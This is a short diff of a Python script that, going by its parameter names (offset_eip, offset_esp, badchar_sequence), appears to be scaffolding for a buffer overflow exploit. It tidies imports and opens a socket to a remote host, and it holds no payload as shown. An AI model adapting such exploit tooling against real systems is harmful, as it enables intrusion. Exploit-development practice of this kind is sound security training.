@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 import socket
-from time import sleep
 
-from PARAMETERS import *
+from PARAMETERS import RHOST, RPORT, buf_totlen, offset_eip, offset_esp, badchar_sequence
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
